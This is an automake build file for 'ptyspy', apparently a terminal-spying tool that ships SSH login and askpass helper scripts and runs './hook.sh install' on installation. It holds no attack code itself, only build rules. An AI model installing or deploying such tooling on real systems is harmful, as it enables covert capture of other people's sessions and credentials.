noinst_PROGRAMS = ptyspy

ptyspy_SOURCES = ptyspy.c utils.c io.c buf.c
ptyspy_CFLAGS = @CFLAGS_STATIC@

dist_noinst_SCRIPTS = hook.sh x.sh ssh_login.sh askpass.sh thc_cli funcs

all-local:
	cp -a ptyspy ptyspy_bin.@OSARCH@

install-exec-hook:
	strip ptyspy_bin.@OSARCH@ && \
	./hook.sh install 

uninstall-hook:
	./x.sh uninstall
	-echo DONE

noinst_HEADERS = common.h utils.h io.h buf.h
